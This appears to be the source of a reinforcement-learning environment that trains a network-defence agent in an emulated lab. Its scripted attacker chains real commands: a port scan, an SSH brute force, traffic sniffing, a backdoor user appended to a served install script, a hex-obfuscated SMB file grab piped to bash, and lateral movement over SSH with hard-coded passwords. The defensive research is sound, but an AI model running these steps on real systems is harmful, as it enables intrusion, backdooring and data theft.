from network_interactions import *
import gymnasium as gym
from gymnasium import spaces
import numpy as np
from constants import *
import re
import xml.etree.ElementTree as ET
import json

class NetworkDefenseEnv(gym.Env):
    def __init__(self):
        print("Init")

        self.docker_ids = {}
        self.gns3_ids = {}
        self.current_rtype = ""
        self.current_action = ""
        self.defend_ref = ""
        self.log_file = "PPO_v2.json"
        self.current_episode = 0


        self.info_stolen = False
        self.step_counter = 0
        self.failed_attack_counter = 0
        self.attack_index = 0
        self.isolated_nodes = set()
        self.timesteps_since_last_alert = 0


        self.attack_chain = [
            scan_range,
            brute_force,
            traffic_scan,
            inject_script,
            get_info,
            read_info
        ]


        # 4 categories (detection, mitigation, containment)
        types = 3
        commands = 2
        nodes = 3
        src_ips = 5

        self.action_space = spaces.MultiDiscrete([types, commands, nodes, src_ips])

        self.observation_space = spaces.Dict({
            "snort_alerts": spaces.Box(low=-1, high=np.inf, shape=(5, 4), dtype=np.int8),    # 5 latest alerts: <src_ip, dst_ip, alert_msg, priority>
            "src_ips": spaces.MultiBinary(5),
            "host_statuses": spaces.Box(low=0, high=2, shape=(4,), dtype=np.int8),
            "alert_summary": spaces.Box(low=0, high=np.inf, shape=(5,), dtype=np.int8)
            })

        self.current_observation = {
            "snort_alerts": np.full((5, 4), -1, dtype=np.int8),
            "src_ips": np.zeros(5, dtype=np.int8),
            "host_statuses": np.ones(4, dtype=np.int8),
            "alert_summary": np.zeros(5, dtype=np.int8)
        }


### STEP FUNCTION ###
    def step(self, action):
        response_type = action[0]
        specific_action = action[1]
        node = action[2]
        ip = action[3]

        # Detection
        if response_type == 0:
            self.current_rtype = "Detection"

            if specific_action == 0:
                print("Add snort rule")
                self.current_action = "Added snort rule"
                self.defend_ref = "D3FEND: D3-NTA Network Traffic Analysis"
                self.add_snort_rule()

            if specific_action == 1:
                print("Idle")
                self.current_action = "Idle"
                self.defend_ref = "N/A Idle"
                self.idle()

        # Mitigation
        elif response_type == 1:
            self.current_rtype = "Mitigation"
            if specific_action == 0:
                print("Blacklisting IP")
                self.defend_ref = "D3FEND: D3-NTF Network Traffic Filtering"

                if self.current_observation["src_ips"][ip] and 0 <= ip < len(constants.REVERSE_IP_ADDRESS_LIST):
                    print("Valid IP Seen in alerts!")
                    target_ip = constants.REVERSE_IP_ADDRESS_LIST[ip]
                    self.current_action = f"Blacklisted IP - {target_ip}"
                    self.blacklist_ip(target_ip)
                else:
                    self.current_action = "Blacklisted IP - Invalid"
                    print("Invalid IP!")

            elif specific_action == 1:
                print(f"Limiting user on {constants.DEFENSE_NODES[node]}")
                self.current_action = "Limited user privileges"
                self.defend_ref = "D3FEND: D3-UAP User Account Permissions"

                self.limit_user(node)

        # Containment
        elif response_type == 2:
            self.current_rtype = "Containment"
            if specific_action == 0:
                print(f"Turning off {constants.DEFENSE_NODES[node]}")
                self.current_action = f"Turned off {constants.DEFENSE_NODES[node]}"
                self.defend_ref = "D3FEND: D3-HS Host Shutdown"

                self.turn_off_node(node)

            elif specific_action == 1:
                print(f"Isolating {constants.DEFENSE_NODES[node]}")
                self.current_action = f"Isolated {constants.DEFENSE_NODES[node]}"
                self.defend_ref = "D3FEND: D3-NI Network Isolation"

                self.isolate_node(node)
                self.isolated_nodes.add(constants.DEFENSE_NODES[node])

        # Attacker's turn
        if self.attack_index < len(self.attack_chain):
            print(f"Executing attack step {self.attack_index + 1}")
            if self.attack_index == len(self.attack_chain) - 1:
                self.info_stolen = self.attack_chain[self.attack_index](self.docker_ids)
                if not self.info_stolen:
                    print("Attack step failed at: ", self.attack_index, self.attack_chain[self.attack_index].__name__)
                    self.failed_attack_counter += 1
            else:
                if self.attack_chain[self.attack_index](self.docker_ids):
                    self.attack_index += 1
                else: 
                    print("Attack step failed at: ", self.attack_index, self.attack_chain[self.attack_index].__name__)
                    self.failed_attack_counter += 1

        # Evaluating state
        print("Evaluating state..")

        node_statuses = self.retrieve_node_status()
        text_logs, np_logs, src_ips = self.retrieve_snort_logs()
        
        self.current_observation["snort_alerts"] = np_logs
        
        self.current_observation["host_statuses"] = node_statuses
        self.current_observation["src_ips"] = src_ips

        self.clear_logs(self.docker_ids)

        reward = self.calculate_reward(self.current_observation["host_statuses"], self.attack_index, self.info_stolen)
        print("Reward:", reward)
        
        terminated = self.info_stolen or self.attack_index == len(self.attack_chain) or self.failed_attack_counter >= 3 or self.step_counter > 10
        truncated = False
        
        print("OBSERVATION LOGS", self.current_observation["snort_alerts"])
        print("SUMMARY", self.current_observation["alert_summary"])
        self._log_to_json(
            episode=self.current_episode,
            step=self.step_counter,
            observation=text_logs,
            response_type=self.current_rtype,
            d3fend_reference=self.defend_ref,
            action_taken=self.current_action,
            reward=reward
        )

        print("Step done")
        self.step_counter += 1

        return self.current_observation.copy(), reward, terminated, truncated, {}

    def reset(self, seed=None, options=None):
        print("Resetting..")
        self.current_observation = {
            "snort_alerts": np.full((5, 4),- 1, dtype=np.int8),
            "host_statuses": np.ones(4, dtype=np.int8),
            "src_ips": np.zeros(5, dtype=np.int8),
            "alert_summary": np.zeros(5, dtype=np.int8)
        }

        self.attack_index = 0
        self.step_counter = 0
        self.info_stolen = False
        self.current_rtype = ""
        self.current_action = ""
        self.defend_ref = ""
        self.failed_attack_counter = 0
        self.timesteps_since_last_alert = 0
        self.isolated_nodes = set()
        self.current_episode += 1
        
        restart_sim()
        self.start_all()
        self.gns3_ids, self.docker_ids = collect_node_ids()

        check_traffic(self.docker_ids)

        start_snort(self.docker_ids)
        start_shorewall(self.docker_ids)
        start_traffic(self.docker_ids)

        return self.current_observation, {}



### ACTIONS ###
# Detection
    # Adds a snort rule detecting malicious scripts in http traffic and restarts snort to apply rule
    def add_snort_rule(self):
        rule = 'alert tcp 172.17.100.2 80 -> any any (msg:"Malicious Script Detected - Unauthorized User Creation"; flow:to_client,established; content:"useradd"; nocase; content:"chpasswd"; nocase; depth:500; classtype:attempted-admin; priority:1; sid:1000011; rev:1;)'
        escaped_rule = rule.replace('"','\\"')

        command = f'sh -c \'echo "{escaped_rule}" >> /etc/snort/rules/local.rules\''
        execute_command(self.docker_ids["IDPS"], command)
        restart_snort(self.docker_ids)

# Mitigation
    # Adds target IP to blacklist and restarts firewall to apply updated blacklist
    def blacklist_ip(self, target_ip):
        command = (
            f'echo REJECT net:{target_ip} all all >> /etc/shorewall/rules '
            '&& shorewall reload'
        )
        execute_command(self.docker_ids["IDPS"], command)

    def limit_user(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        command = f'deluser james pcap'
        execute_command(self.docker_ids[name], command)

# Containment
    def turn_off_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.gns3_ids[name]
        stop_node(id)
        print(f"Node {name} turned off")

    def isolate_node(self, node_id):
        command = "ifconfig eth0 down"
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        execute_command(id, command)

# Idle
    def idle(self):
        print("idle, do nothing")

# Other

    def start_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        start_node(id)
        print(f"Node {node_id} restarted")

    def restart_node(self, node_id):
        name = constants.DEFENSE_NODES[node_id]
        id = self.docker_ids[name]
        restart_node(id)
        print(f"Node {node_id} restarted")

    def start_all(self):
        start_nodes()

    def restart(self):
        restart_sim()

# Observation methods
    def retrieve_snort_logs(self):
        command = "cat /var/log/snort/alert"
        node = self.docker_ids["IDPS"]
        output_data = execute_command(node, command)

        # Pattern for regular snort log output
        alert_pattern = re.compile(
            r'(?P<timestamp>\d{2}/\d{2}-\d{2}:\d{2}:\d{2}\.\d+)\s+\[\*\*\]\s+\[(?P<sid>\d+):(?P<gid>\d+):(?P<rev>\d+)\]\s+(?P<alert_msg>[^\[]+)\s+\[\*\*\]\s+'
            r'\[Classification:\s+(?P<classification>[^\]]+)\]\s+\[Priority:\s+(?P<priority>\d+)\]\s+\{(?P<protocol>\w+)\}\s+'
            r'(?P<src_ip>\d+\.\d+\.\d+\.\d+)(:(?P<src_port>\d+))?\s*->\s*(?P<dst_ip>\d+\.\d+\.\d+\.\d+)(:(?P<dst_port>\d+))?',
            re.MULTILINE
        )

        matches = [match.groupdict() for match in alert_pattern.finditer(output_data)]


        np_logs = np.full((5, 4), -1, dtype=np.int8)
        text_logs = []

        src_ips = self.current_observation["src_ips"]

        i = 0
        # Store last 5 alerts
        for idx, match in enumerate(matches):
            if i >= 5:
                break
            if match['alert_msg'] not in ('ICMP Destination Unreachable Host Unreachable'):
                print(match['classification'], match['alert_msg'])
                text_logs.append({
                    "timestamp": match["timestamp"],
                    "alert_msg": match['alert_msg'],
                    "classification": match['classification'],
                    "src_ip": match['src_ip'],
                    "dst_ip": match['dst_ip'],
                    "priority": int(match["priority"])
                })

                src_ip = constants.IP_ADDRESS_MAP[match['src_ip']]
                dst_ip = constants.IP_ADDRESS_MAP[match['dst_ip']]
                alert_msg = constants.ALERT_MAP[match['alert_msg']]

                priority = int(match['priority'])
                np_logs[i] = [src_ip, dst_ip, alert_msg, priority]
                
                i+= 1

                if 0 <= src_ip < len(src_ips):
                    src_ips[src_ip] = 1

        # Reset timestep since last alert check
        alerts = [alert for alert in np_logs if alert[0] != -1]
        
        if alerts:
            self.timesteps_since_last_alert = 0
        else: 
            self.timesteps_since_last_alert += 1

        count_priority_1 = sum(1 for alert in alerts if int(alert[3]) == 1)
        count_priority_2 = sum(1 for alert in alerts if int(alert[3]) == 2)
        count_priority_3 = sum(1 for alert in alerts if int(alert[3]) >= 3)
        total_alerts = len(alerts)
        
        # Update alert summary in observation space
        self.current_observation["alert_summary"][0] += count_priority_1
        self.current_observation["alert_summary"][1] += count_priority_2
        self.current_observation["alert_summary"][2] += count_priority_3
        self.current_observation["alert_summary"][3] += total_alerts
        self.current_observation["alert_summary"][4] = self.timesteps_since_last_alert

        return text_logs, np_logs, src_ips

    def retrieve_node_status(self):
        URL = f'http://192.168.33.7:3080/v2/projects/{constants.PROJECT_ID}/nodes'

        response = requests.get( URL, headers={'Content-Type': 'application/x-www-form-urlencoded', })
        if response.status_code == 200:
            data = response.json()
        else:
            print("Failed to fetch data. Status code:", response.status_code)

        hosts = np.zeros(4, dtype=np.int8)
        for node in data:
            if node['name'] in constants.DEFENSE_NODES_MAP.keys():
                index = constants.DEFENSE_NODES_MAP[node['name']]
                if node['status'] == 'stopped':
                    hosts[index] = 2
                elif node['name'] in self.isolated_nodes:
                    hosts[index] = 1
                elif node['status'] == 'started':
                    hosts[index] = 0

        return hosts
    
    def calculate_reward(self, statuses, attack_index, info_stolen):
        multiplier = 0
        impact = 0
        for (i,status) in enumerate(statuses):
            node = constants.DEFENSE_NODES[i]
            if status == 0:
                multiplier = 0
            if status == 1:
                multiplier = 1
            if status == 2:
                multiplier = 1.5
            impact += multiplier*constants.CRITICAL_INDEX_MAP[node]
        
        return round(float(20 - impact - 2*attack_index), 4) if not info_stolen else 0

    def clear_logs(self, dockers):
        command = '''sh -c 'echo "" > /var/log/snort/alert' '''
        execute_command(dockers["IDPS"], command)
        test = 'cat /var/log/snort/alert'
        res = execute_command(dockers["IDPS"], test)
        print("SNORT ALERTS WIPED?:", res)
    
    def _log_to_json(self, **kwargs):
        def convert(obj):
            if isinstance(obj, np.ndarray):
                return obj.tolist()
            return obj

        converted_kwargs = {key: convert(value) for key, value in kwargs.items()}

        try:
            with open(self.log_file, "r") as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []

        logs.append(converted_kwargs)  # Append new log entry

        # Overwrite file with updated logs (formatted JSON)
        with open(self.log_file, "w") as f:
            json.dump(logs, f, indent=4)


def start_snort(docker_ids):
    command = 'snort -c /etc/snort/snort.conf -i eth2 -i eth1 -i eth0 -A fast -l /var/log/snort -D'
    execute_command(docker_ids["IDPS"], command)

def restart_snort(docker_ids):
    command = "pkill -9 snort"
    execute_command(docker_ids["IDPS"], command)
    start_snort(docker_ids)

def start_shorewall(docker_ids):
    command = "shorewall start"
    execute_command(docker_ids["IDPS"], command)

### Scripted attack
# Reconnaissance
def scan_range(docker_ids):
    command = constants.NMAP_SCAN + ' 192.42.0.10 2>/dev/null'
    print(f"Port scanning")
    result = execute_command(docker_ids["COZYBEAR"], command)
    return parse_nmap(result)

# Brute force
def brute_force(docker_ids):
    command = f'medusa -h 192.42.0.10 -U /seclists/usr.txt -P /seclists/pass.txt -M ssh | grep FOUND'
    print("Brute Forcing")
    result = execute_command(docker_ids["COZYBEAR"], command)
    return parse_medusa_output(result)

# Traffic sniffing
def traffic_scan(docker_ids):
    print("Scanning traffic")
    command = "timeout 2 tcpdump -i any -v"
    result = command_repo_server(command, docker_ids)
    return parse_traffic(result)

# Injecting malicious script
def inject_script(docker_ids):
    print("Injecting script")
    payload = "useradd -m -s /bin/bash dylan && echo 'dylan:h4ck3d' | chpasswd"
    command = f'sh -c "echo \\"{payload}\\" >> /var/www/html/reposerver/install.sh"'

    result = command_elevated_repo_server(command, docker_ids)
    return "[SUCCESS]" in result

# Downloading sensitive info
def get_info(docker_ids):
    print("getting info")
    smb_command = 'smbclient //192.168.100.3/Fileshare -U guest%guest -c "prompt off; mget *"'
    encoded_cmd = smb_command.encode('utf-8').hex()
    command = f'echo -n "{encoded_cmd}" | xxd -r -p | bash'

    result = command_admin_pc(command, docker_ids)
    return "[SUCCESS]" in result

# Reading sensitive info
def read_info(docker_ids):
    print("reading info")
    command = "cat financial_report.txt"
    result = command_admin_pc(command, docker_ids)
    return "This is a confidential report" in result


### Attack helper commands

# Attacker logs in to repo server and executes one command
def command_repo_server(command, docker_ids):
    ssh_command = f'''sshpass -p james2 \
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 james@192.42.0.10 \
    'sh -c "{command}"' '''

    return execute_command(docker_ids["COZYBEAR"], ssh_command)

# Attacker logs into repo server on elevated privileges and executes one command
def command_elevated_repo_server(command, docker_ids):
    ssh_command = f"""sshpass -p x0sTsQwj4 \
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user5@192.42.0.10 \
    '{command} 2>&1 && echo [SUCCESS] || echo [ERROR]'"""

    return execute_command(docker_ids["COZYBEAR"], ssh_command)

# Attacker moves laterally from repo server to admin pc and executes one command
def command_admin_pc(command, docker_ids):
    admin_password = "h4ck3d"
    admin_pc_ip = "192.168.100.2"

    nested_ssh_command = f'''sshpass -p james2 \
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 james@192.42.0.10 \
    'sshpass -p {admin_password} \
    ssh -T -o StrictHostKeyChecking=no -o ConnectTimeout=3 dylan@{admin_pc_ip} \
    "sh -c \\"{command} 2>&1 && echo [SUCCESS] || echo [ERROR]\\""' '''

    return execute_command(docker_ids["COZYBEAR"], nested_ssh_command)

def parse_nmap(data):
    root = ET.fromstring(data)
    print("parsing")
    for host in root.findall("host"):
        status = host.find("status").get("state")
        if status == "up":
            return True
    return False

def parse_medusa_output(data):
    pattern = r"ACCOUNT FOUND: \[ssh\] Host: (\S+) User: (\S+) Password: (\S+) \[SUCCESS\]"
    for line in data.splitlines():
            match = re.search(pattern, line)
            if match:
                return True
    return False

def parse_traffic(data):
    for line in data.splitlines():
        if "Authorization: Basic" in line.strip():
            return True
    return False


### Misc Commands
def collect_node_ids():
    URL = f'http://192.168.33.7:3080/v2/projects/{constants.PROJECT_ID}/nodes'
    response = requests.get(URL, headers={})
    gns3_dict = {}
    docker_dict = {}
    for node in response.json():
        gns3_dict[node['name']] = node['node_id']

        if 'docker' in node['node_type']:
            name = node['name']
            id = node ['properties']['container_id'][:12]
            docker_dict[name] = id
    return gns3_dict, docker_dict

def check_traffic(docker_ids):
    command = "timeout 5 ping 192.42.0.10"
    done = False
    while not done:
        res = execute_command(docker_ids["COZYBEAR"], command)
        if res != '' and '64 bytes from 192.42.0.10' in res.split("\n")[-2]:
            print("Ready")
            done = True
        else:
            print("Not ready")
            done = False

def start_traffic(docker_ids):
    command = "nohup bash /root/fetch.sh > /dev/null 2>&1 & "
    execute_command(docker_ids["AdminPC"], command)
